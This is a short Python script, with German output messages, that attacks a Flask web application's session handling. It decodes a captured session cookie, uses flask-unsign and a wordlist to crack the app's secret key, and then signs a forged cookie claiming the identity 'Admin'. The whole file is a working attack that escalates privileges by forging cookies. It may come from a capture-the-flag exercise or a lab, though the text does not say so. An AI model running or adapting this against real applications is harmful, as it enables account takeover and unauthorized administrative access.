import os
import subprocess
import flask_unsign_wordlist

found_cookie = "eyJjc3JmX3Rva2VuIjoiZTNmYjhhNGRkZWIzM2QwOGMxODBlZDQzNDQ3OTdiYjk1MDRmYzg4MiIsIm5hbWUiOiJ0ZXN0In0.Zn22vQ.Dz-xmi6dTHo_DnATkQ_Z9Ch3zAs"

cookie_result = subprocess.run(['flask-unsign', '--decode', '--cookie', found_cookie], capture_output=True, text=True)
print("Der Inhalt aus dem dekodiertem Cookie: ", cookie_result.stdout)

secret = subprocess.run(['flask-unsign', '--unsign', '--cookie', found_cookie, '--wordlist', './5.txt', '--no-literal-eval'], capture_output=True, text=True)
secret_key = secret.stdout
print("Das geknackte Secret: ", secret_key)

cookie_content= "{'name': 'Admin'}"
crafted_cookie = subprocess.run(['flask-unsign', '--sign', '--cookie', cookie_content, '--secret', secret_key], capture_output=True, text=True)
print("Selbst signierte Cookie: ", crafted_cookie.stdout)
